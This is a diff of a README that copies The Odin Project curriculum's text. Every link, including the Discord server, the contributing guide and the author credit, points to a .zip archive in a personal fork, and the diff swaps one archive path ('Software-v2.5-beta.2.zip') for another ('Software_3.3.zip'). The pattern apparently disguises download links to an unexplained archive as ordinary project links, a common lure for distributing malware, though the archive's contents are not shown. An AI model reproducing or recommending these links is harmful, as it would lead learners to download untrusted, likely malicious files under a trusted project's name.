@@ -1,16 +1,16 @@
 # The Odin Project Curriculum
 
-[The Odin Project](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip) (TOP) is an open-source curriculum for learning full-stack web development. Our curriculum is divided into distinct courses, each covering the subject language in depth. Each course contains a listing of lessons interspersed with multiple projects. These projects give users the opportunity to practice what they are learning, thereby reinforcing and solidifying the theoretical knowledge learned in the lessons. Completed projects may then be included in the user's portfolio.
+[The Odin Project](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip) (TOP) is an open-source curriculum for learning full-stack web development. Our curriculum is divided into distinct courses, each covering the subject language in depth. Each course contains a listing of lessons interspersed with multiple projects. These projects give users the opportunity to practice what they are learning, thereby reinforcing and solidifying the theoretical knowledge learned in the lessons. Completed projects may then be included in the user's portfolio.
 
 Lessons are structured through a combination of original written content and a compilation of carefully curated resources from the web. This is where the contributing happens!
 
-This repo contains the actual lesson files used on our website. For the actual TOP app that pulls in this lesson content and contains our front-end and back-end code, please go to the [main TOP repo](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip).
+This repo contains the actual lesson files used on our website. For the actual TOP app that pulls in this lesson content and contains our front-end and back-end code, please go to the [main TOP repo](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip).
 
-Our community can be found on the [TOP Discord server](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip).
+Our community can be found on the [TOP Discord server](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip).
 
 ## Contributing
 
-The Odin Project depends on open-source contributions to improve, grow, and thrive. We welcome contributors of all experience levels and backgrounds to help maintain this awesome curriculum and community. If you would like to contribute to our curriculum, be sure to thoroughly read our [contributing guide](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip).
+The Odin Project depends on open-source contributions to improve, grow, and thrive. We welcome contributors of all experience levels and backgrounds to help maintain this awesome curriculum and community. If you would like to contribute to our curriculum, be sure to thoroughly read our [contributing guide](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip).
 
 Some of the things you can do to contribute to our curriculum include:
 
@@ -22,8 +22,8 @@ Some of the things you can do to contribute to our curriculum include:
 
 **Happy Coding!**
 
-See [https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip) for usage details.
+See [https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip) for usage details.
 
 ___
 
-Created by [Erik Trautman](https://raw.githubusercontent.com/risshhav/curriculum/main/ruby/Software-v2.5-beta.2.zip).
+Created by [Erik Trautman](https://github.com/risshhav/curriculum/raw/refs/heads/main/getting_hired/preparing_for_job_search/Software_3.3.zip).
